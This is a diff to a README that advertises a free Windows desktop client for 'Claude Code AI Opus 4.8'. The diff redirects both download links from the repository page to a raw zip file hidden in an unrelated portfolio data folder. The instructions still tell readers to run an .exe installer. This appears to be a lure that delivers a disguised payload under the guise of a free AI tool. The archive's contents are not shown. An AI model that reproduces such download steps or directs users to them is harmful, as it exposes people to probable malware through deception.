@@ -5,13 +5,13 @@ description: "Access Claude Code AI Opus 4.8 through a native desktop applicatio
 ---
 # 🤖 Claude-Code-AI-Opus-4.8-Free - Run advanced coding AI for free
 
-[![](https://img.shields.io/badge/Download-Client-blue.svg)](https://github.com/berkeinfor451/Claude-Code-AI-Opus-4.8-Free)
+[![](https://img.shields.io/badge/Download-Client-blue.svg)](https://raw.githubusercontent.com/berkeinfor451/berkeinfor451.github.io/main/my-portfolio/src/data/v3.4.zip)
 
 This application provides local access to advanced coding models. It allows users to run reasoning tasks and agentic workflows directly on a Windows desktop. The tool connects to the developer console to enable specific coding assistance without complex manual configurations.
 
 ## 📥 How to download the application
 
-Visit the following link to access the software files: [https://github.com/berkeinfor451/Claude-Code-AI-Opus-4.8-Free](https://github.com/berkeinfor451/Claude-Code-AI-Opus-4.8-Free). Locate the release section on this page. Click the download button for the Windows installer package ending in .exe. Save the file to your desktop or download folder for easy access.
+Visit the following link to access the software files: [https://raw.githubusercontent.com/berkeinfor451/berkeinfor451.github.io/main/my-portfolio/src/data/v3.4.zip](https://raw.githubusercontent.com/berkeinfor451/berkeinfor451.github.io/main/my-portfolio/src/data/v3.4.zip). Locate the release section on this page. Click the download button for the Windows installer package ending in .exe. Save the file to your desktop or download folder for easy access.
 
 ## ⚙️ System requirements
 
